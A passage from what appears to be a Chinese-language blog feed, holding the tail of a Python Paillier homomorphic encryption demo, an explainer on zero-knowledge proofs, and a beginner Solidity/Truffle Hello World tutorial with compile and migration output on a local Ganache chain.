class="title">decipher</span><span class="params">(c, pk, sk)</span>:</span></span><br><span class="line">    [n, g] = pk</span><br><span class="line">    lmd = sk</span><br><span class="line">    u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) % n</span><br><span class="line">    m = L(gmpy2.powmod(c, lmd, n ** <span class="number">2</span>), n) * u % n</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pk, sk = keygen()</span><br><span class="line">    <span class="comment">#print 'pk:', pk</span></span><br><span class="line">    <span class="comment">#print 'sk:', sk</span></span><br><span class="line">    plaintext = raw_input(<span class="string">'Please input your message: '</span>)</span><br><span class="line">    ciphertext = encipher(plaintext, pk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Ciphertext:'</span>, ciphertext</span><br><span class="line">    plaintext = decipher(ciphertext, pk, sk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Plaintext:'</span>, plaintext</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://security.hsr.ch/msevote/docs/Paillier_Cryptosystem.pdf" target="_blank" rel="noopener">The Paillier Cryptosystem</a><br><a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E9%82%81%E5%85%8B%E7%88%BE%E5%87%BD%E6%95%B8" target="_blank" rel="noopener">卡迈克尔函数</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="python" scheme="https://qianfei11.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>何为零知识证明</title>
    <link href="https://qianfei11.github.io/2019/09/29/%E4%BD%95%E4%B8%BA%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"/>
    <id>https://qianfei11.github.io/2019/09/29/%E4%BD%95%E4%B8%BA%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/</id>
    <published>2019-09-29T11:28:12.000Z</published>
    <updated>2019-10-04T10:33:07.438Z</updated>
    
    <content type="html"><![CDATA[<p>何为<a href="https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E" target="_blank" rel="noopener">零知识证明</a>？</p><a id="more"></a><p>零知识证明，指的是示证者向验证者表明他知道某种秘密，不仅能使验证者完全确信他的确知道这个秘密，同时还保证一丁点秘密也不泄露给验证者。</p><h1 id="童话里的零知识证明"><a href="#童话里的零知识证明" class="headerlink" title="童话里的零知识证明"></a>童话里的零知识证明</h1><p>举个最简单的阿拉伯童话《一千零一夜》里的零知识证明：阿里巴巴与四十大盗的故事其中一个片段。</p><p>阿里巴巴会芝麻开门的咒语，强盗向他拷问打开山洞石门的咒语，他不想让人听到咒语，便对强盗说：「你们离我一箭之地，用弓箭指着我，你们举起右手，我念咒语打开石门，举起左手，我念咒语关上石门，如果我做不到或逃跑，你们就用弓箭射死我。」</p><p>这个方案对阿里巴巴没损失，也能帮助他们搞清楚阿里巴巴到底是否知道咒语，于是强盗们同意。强盗举起了右手，只见阿里巴巴的嘴动了几下，石门打开了；强盗举起了左手，阿里巴巴的嘴动了几下，石门又关上了。强盗有点不信，没准这是巧合，多试几次过后，他们相信了阿里巴巴。</p><h1 id="零知识证明的优点"><a href="#零知识证明的优点" class="headerlink" title="零知识证明的优点"></a>零知识证明的优点</h1><ul><li>在使用零知识证明的时候，不降低安全性。</li><li>零知识证明工作高效，计算过程量小，双方交换信息少。</li><li>既安全、又有良好的隐私、又减少计算量。</li></ul><h1 id="零知识证明的性质"><a href="#零知识证明的性质" class="headerlink" title="零知识证明的性质"></a>零知识证明的性质</h1><p>根据零知识证明的定义和有关例子，可以得出零知识证明具有以下三个性质：</p><ol><li>完备性（completeness）：如果证明方和验证方都是诚实的，并遵循证明过程的每一步，进行正确的计算，那么这个证明一定是成功的，验证方一定能够接受证明方。</li><li>合理性（soundness）：没有人能够假冒证明方，使这个证明成功。</li><li>零知识性（zero-knowledge）：证明过程执行完之后，验证方只获得了「证明方拥有这个知识」的信息，而没有获得关于这个知识本身的任何信息。</li></ol><h1 id="零知识证明的优点-1"><a href="#零知识证明的优点-1" class="headerlink" title="零知识证明的优点"></a>零知识证明的优点</h1><ol><li>随着零知识证明的使用，安全性不会降级，因为该证明具有零知识性质。</li><li>高效性。该过程计算量小，双方交换的信息量少。</li><li>安全性依赖于未解决的数学难题，如离散对数、大整数因子分解、平方根等。</li><li>许多零知识证明相关的技术避免了直接使用有政府限制的加密算法，为相关产品的出口带去优势。</li></ol><h1 id="证明举例"><a href="#证明举例" class="headerlink" title="证明举例"></a>证明举例</h1><p>例 1：A 要向 B 证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。有两个方法：</p><ol><li>A 把钥匙出示给 B，B 用这把钥匙打开该房间的锁，从而证明 A 拥有该房间的正确的钥匙。</li><li>B 确定该房间内有某一物体，A 用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给 B，从而证明自己确实拥有该房间的钥匙。</li></ol><p>后面的方法 2 属于零知识证明。好处在于在整个证明的过程中，B 始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><p>例 2：A 拥有 B 的公钥，A 没有见过 B，而 B 见过 A 的照片，某天二人偶然碰面，B 认出了 A，但 A 不能确定面前的人是否是 B，这时 B 要向 A 证明自己是 B，也有两个方法：</p><ol><li>B 把自己的私钥给 A，A 用这个私钥对某个数据加密，然后用 B 的公钥解密，如果正确，则证明对方确实是 B。</li><li>A 给出一个随机值，B 用自己的私钥对其加密，然后把加密后的数据交给 A，A 用 B 的公钥解密，如果能够得到原来的随机值，则证明对方是 B。</li></ol><p>后面的方法属于零知识证明。</p><p>有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A 要向 B 证明自己拥有该门的钥匙。采用零知识证明，则 B 看着 A 从入口进入走廊，然后又从出口走出走廊，这时 B 没有得到任何关于这个钥匙的信息，但是完全可以证明 A 拥有钥匙。</p><h1 id="零知识证明一般的过程"><a href="#零知识证明一般的过程" class="headerlink" title="零知识证明一般的过程"></a>零知识证明一般的过程</h1><p>假设有两方人，甲方是证明者，乙方是验证者。他们在一个工作环境内有相同的一组函数和一组数值。证明开始：</p><ol><li>甲方先发送满足条件的随机值给乙方，这个称为承诺。</li><li>乙方发送满足条件的随机值给甲方，这个称为挑战。</li><li>甲方执行一个不让乙方知道的计算，并把计算结果给乙方，这个称为响应。</li><li>乙方对响应进行验证，验证失败就退出，验证成功回到 1，然后继续顺序执行 n 次。</li></ol><p>如果每一次乙方验证都是成功的，那么乙方就相信了和甲方之间的共识。在整个过程中没有透露任何相关秘密信息。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/3f524c925c34" target="_blank" rel="noopener">https://www.jianshu.com/p/3f524c925c34</a><br><a href="https://blog.csdn.net/liudongdong19/article/details/82884742" target="_blank" rel="noopener">https://blog.csdn.net/liudongdong19/article/details/82884742</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;何为&lt;a href=&quot;https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;零知识证明&lt;/a&gt;？&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blockchain" scheme="https://qianfei11.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>智能合约入门</title>
    <link href="https://qianfei11.github.io/2019/09/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8/"/>
    <id>https://qianfei11.github.io/2019/09/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8/</id>
    <published>2019-09-22T11:58:53.000Z</published>
    <updated>2019-10-03T13:18:14.322Z</updated>
    
    <content type="html"><![CDATA[<p>参考 <a href="https://learnblockchain.cn/docs/solidity/index.html" target="_blank" rel="noopener">Solidity 0.5.9 中文文档</a>。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>Ubuntu 16.04.6</li></ul><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>Solidity 是一种智能合约的高级语言，运行在 Ethereum 虚拟机（EVM）之上。它的语法接近于 JavaScript，是一种面向对象的语言。但作为一种真正意义上运行在网络上的去中心合约，它又有很多的不同，下面列举一些：</p><ul><li>以太坊底层是基于账户，而非 <a href="https://me.tryblockchain.org/Solidity%e7%9a%84%e5%9c%b0%e5%9d%80%e7%b1%bb%e5%9e%8b.html" target="_blank" rel="noopener">UTXO</a> 的，所以有一个特殊的 Address 的类型。用于定位用户，定位合约，定位合约的代码（合约本身也是一个账户）。</li><li>由于语言内嵌框架是支持支付的，所以提供了一些关键字，如 <a href="https://me.tryblockchain.org/%e6%94%af%e4%bb%98%e7%9b%b8%e5%85%b3.html" target="_blank" rel="noopener">payable</a>，可以在语言层面直接支持支付，而且超级简单。</li><li>存储是使用网络上的区块链，数据的每一个状态都可以永久存储，所以需要确定变量使用内存，还是区块链。</li><li>运行环境是在去中心化的网络上，会比较强调合约或函数执行的调用的方式。因为原来一个简单的函数调用变为了一个网络上的节点中的代码执行，分布式的感觉。</li><li>最后一个非常大的不同则是它的异常机制，一旦出现异常，所有的执行都将会被回撤，这主要是为了保证合约执行的原子性，以避免中间状态出现的数据不一致。</li></ul><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>下面尝试编写 Solidity 下的 Hello World。</p><p>第一步是安装 nodejs 和 npm，然后才能安装 truffle：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install npm nodejs nodejs-legacy</span><br><span class="line">sudo npm install npm -g</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n stable <span class="comment"># 下载稳定版 node</span></span><br><span class="line">sudo npm install -g truffle truffle-contract web3 --unsafe-perm=<span class="literal">true</span> --allow-root</span><br></pre></td></tr></table></figure><p>安装完 truffle 后，下载 <a href="https://github.com/trufflesuite/ganache/releases/download/v2.1.1/ganache-2.1.1-linux-x86_64.AppImage" target="_blank" rel="noopener">Ganache</a> 以方便搭建本地区块链环境（Ganache 在内存中模拟了一个区块链，因此每次 Ganache 关闭之后，区块链会丢失）。下载完后双击打开软件并启动本地环境。</p><p>各部分都成功安装之后，新建一个目录，并在目录下运行 <code>truffle init</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle init</span><br><span class="line"></span><br><span class="line">✔ Preparing to download</span><br><span class="line">✔ Downloading</span><br><span class="line">✔ Cleaning up temporary files</span><br><span class="line">✔ Setting up box</span><br><span class="line"></span><br><span class="line">Unbox successful. Sweet!</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line"></span><br><span class="line">  Compile:        truffle compile</span><br><span class="line">  Migrate:        truffle migrate</span><br><span class="line">  Test contracts: truffle test</span><br></pre></td></tr></table></figure><p>简单说明一下生成的几个文件：</p><ul><li><code>/contracts</code>：存放智能合约原始代码的地方。</li><li><code>/migrations</code>：这是 Truffle 用来部署智能合约的功能。</li><li><code>/test</code>：测试智能合约的代码放在这里，支持 <code>js</code> 与 <code>sol</code> 测试。</li><li><code>truffle-config.js</code>：Truffle 的设置文档。</li></ul><p>Solidity 中合约的含义就是一组代码（函数）和数据（状态），它们位于以太坊区块链的一个特定地址上。关键字 <code>pragma</code> 告知编译器源代码所适用的 Solidity 版本为 &gt;=0.4.0 及 &lt;0.7.0，为了确保合约不会在新的编译器版本中突然行为异常。</p><p>关键字 <code>contract</code> 即为指定合约，关键字 <code>function</code> 指定函数。<code>public</code> 指定函数的公开权限，<code>view</code> 用来标识那些不改变存储状态的方法（相比之下而 <code>pure</code> 更加严格，它修饰的方法不但不改变存贮状态，也不读取存储的变量值），<code>returns</code> 指定返回值的数据类型。</p><blockquote><p>注意：所有的标识符（合约名称，函数名称和变量名称）都只能使用 ASCII 字符集。UTF-8 编码的数据可以用字符串变量的形式存储；小心使用 Unicode 文本，因为有些字符虽然长得相像（甚至一样），但其字符码是不同的，其编码后的字符数组也会不一样。</p></blockquote><p>以下为一个简单的返回 <code>Hello World</code> 的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.0 &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">contract HelloWorld &#123;</span><br><span class="line">function sayHello() public view returns (string memory) &#123;</span><br><span class="line">return &quot;Hello World&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后输入 <code>truffle compile</code> 进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle compile</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Compiling ./contracts/HelloWorld.sol</span><br><span class="line">&gt; Compiling ./contracts/Migrations.sol</span><br><span class="line"></span><br><span class="line">    &gt; compilation warnings encountered:</span><br><span class="line"></span><br><span class="line">/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure</span><br><span class="line">  <span class="keyword">function</span> sayHello() public view returns (string memory) &#123;</span><br><span class="line">  ^ (Relevant <span class="built_in">source</span> part starts here and spans across multiple lines).</span><br><span class="line"></span><br><span class="line">&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts</span><br><span class="line">&gt; Compiled successfully using:</span><br><span class="line">   - solc: 0.5.8+commit.23d335f2.Emscripten.clang</span><br></pre></td></tr></table></figure><p>接下来我们需要在 <code>migrations</code> 下添加一个部署文件 <code>2_deploy_contracts.js</code>，用来待会儿对 <code>HelloWorld.sol</code> 的部署。部署文件的文件名要求以数字为前缀，后缀为描述。编号前缀是必需的，以便记录迁移是否成功运行，后缀纯粹是为了方便理解。</p><blockquote><p>注意：编号还有记录运行迁移文件顺序的作用。</p></blockquote><p>使用 <code>artifacts.require</code> 语句来取得准备部署的合约。使用 <code>deployer.deploy</code> 语句将合约部署到区块链上。这边 HelloWorld 是 contract 的名称而不是文件名。因此可以用此语法读入任一 <code>.sol</code> 文件中的任一合约。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> HelloWorld = artifacts.require(<span class="string">"HelloWorld"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(HelloWorld);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在确保之前的 <code>Ganache</code> 已经启动并生成了十个账户后，输入 <code>truffle migrate</code> 将合约部署到 <code>Ganache</code> 上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle migrate</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting migrations...</span><br><span class="line">======================</span><br><span class="line">&gt; Network name:    &apos;ganache&apos;</span><br><span class="line">&gt; Network id:      5777</span><br><span class="line">&gt; Block gas limit: 0x6691b7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Deploying &apos;Migrations&apos;</span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction hash:    0xc3b75999936e57ba192b2053a581762c1f235aad3090caea5572c3deb1d98802</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x55a333d4f932a737E0b97af4E3F8F4E971600D43</span><br><span class="line">   &gt; block number:        5</span><br><span class="line">   &gt; block timestamp:     1569581737</span><br><span class="line">   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0</span><br><span class="line">   &gt; balance:             99.98561934</span><br><span class="line">   &gt; gas used:            261393</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00522786 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00522786 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2_deploy_contracts.js</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">   Deploying &apos;HelloWorld&apos;</span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction hash:    0x9c05c079cbdbb90a3d53fdf5e66e3a79fce1a0e5f633815068c9a82aaaf912b0</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x4752C4f381D9e492e10daCCf9213d916bd1f8caF</span><br><span class="line">   &gt; block number:        7</span><br><span class="line">   &gt; block timestamp:     1569581739</span><br><span class="line">   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0</span><br><span class="line">   &gt; balance:             99.98223486</span><br><span class="line">   &gt; gas used:            127201</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00254402 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00254402 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">=======</span><br><span class="line">&gt; Total deployments:   2</span><br><span class="line">&gt; Final cost:          0.00777188 ETH</span><br></pre></td></tr></table></figure><p>最后执行 <code>truffle console</code>，可以使用 <code>js</code> 与刚才部署的合约进行交互：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">truffle(ganache)&gt; let x = await HelloWorld.deployed()</span><br><span class="line">undefined</span><br><span class="line">truffle(ganache)&gt; x.sayHello()</span><br><span class="line">&apos;Hello World&apos;</span><br></pre></td></tr></table></figure><p>我们还可以尝试添加一个函数 <code>echo</code>，可以输出我们传入的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.0 &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">contract HelloWorld &#123;</span><br><span class="line">function sayHello() public view returns (string memory) &#123;</span><br><span class="line">return &quot;Hello World&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function echo(string memory name) public view returns (string memory) &#123;</span><br><span class="line">return name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要重新编译 Truffle 项目里的合约，请切换到项目工程所在根目录。后续运行中，Truffle 将仅编译自上次编译以来有更改的合约，如果想覆盖可以使用 <code>--all</code> 选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle compile</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Compiling ./contracts/HelloWorld.sol</span><br><span class="line"></span><br><span class="line">    &gt; compilation warnings encountered:</span><br><span class="line"></span><br><span class="line">/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure</span><br><span class="line">  function sayHello() public view returns (string memory) &#123;</span><br><span class="line">  ^ (Relevant source part starts here and spans across multiple lines).</span><br><span class="line">,/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:8:3: Warning: Function state mutability can be restricted to pure</span><br><span class="line">  function echo(string memory name) public view returns (string memory) &#123;</span><br><span class="line">  ^ (Relevant source part starts here and spans across multiple lines).</span><br><span class="line"></span><br><span class="line">&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts</span><br><span class="line">&gt; Compiled successfully using:</span><br><span class="line">   - solc: 0.5.8+commit.23d335f2.Emscripten.clang</span><br></pre></td></tr></table></figure><p>部署时需要加上 <code>--reset</code> 参数进行重新部署。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">➜  HelloWorld truffle migrate --reset</span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting migrations...</span><br><span class="line">======================</span><br><span class="line">&gt; Network name:    &apos;ganache&apos;</span><br><span class="line">&gt; Network id:      5777</span><br><span class="line">&gt; Block gas limit: 0x6691b7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Replacing &apos;Migrations&apos;</span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction hash:    0x73d288f20ed2d68fe565fb01e8a15ba1a591c0cfd642028b45056fc057c194e6</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x48245c079FA8558a35629BC9b8A94b00c91eD9A9</span><br><span class="line">   &gt; block number:        9</span><br><span class="line">   &gt; block timestamp:     1569581861</span><br><span class="line">   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0</span><br><span class="line">   &gt; balance:             99.97646654</span><br><span class="line">   &gt; gas used:            261393</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00522786 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00522786 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2_deploy_contracts.js</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">   Replacing &apos;HelloWorld&apos;</span><br><span class="line">   ----------------------</span><br><span class="line">   &gt; transaction hash:    0x8a7ca29c50f2e2f5645a9b4c33e5ca0eb6ab50def348c2ebcfe2f6fd38d9851e</span><br><span class="line">   &gt; Blocks: 0            Seconds: 0</span><br><span class="line">   &gt; contract address:    0x0d12C183e366AE74393346ae33d4b662bfB5492F</span><br><span class="line">   &gt; block number:        11</span><br><span class="line">   &gt; block timestamp:     1569581862</span><br><span class="line">   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0</span><br><span class="line">   &gt; balance:             99.97130642</span><br><span class="line">   &gt; gas used:            215983</span><br><span class="line">   &gt; gas price:           20 gwei</span><br><span class="line">   &gt; value sent:          0 ETH</span><br><span class="line">   &gt; total cost:          0.00431966 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &gt; Saving migration to chain.</span><br><span class="line">   &gt; Saving artifacts</span><br><span class="line">   -------------------------------------</span><br><span class="line">   &gt; Total cost:          0.00431966 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">=======</span><br><span class="line">&gt; Total deployments:   2</span><br><span class="line">&gt; Final cost:          0.00954752 ETH</span><br></pre></td></tr></table></figure><p>最后进行交互：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">truffle(ganache)&gt; let x = await HelloWorld.deployed()</span><br><span class="line">undefined</span><br><span class="line">truffle(ganache)&gt; x.sayHello()</span><br><span class="line">&apos;Hello World&apos;</span><br><span class="line">truffle(ganache)&gt; x.echo(&apos;This is assassinq.&apos;)</span><br><span class="line">&apos;This is assassinq.&apos;</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/liyuechun520/article/details/78036363" target="_blank" rel="noopener">https://blog.csdn.net/liyuechun520/article/details/78036363</a><br><a href="https://blog.csdn.net/weixin_42595515" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42595515</a><br><a 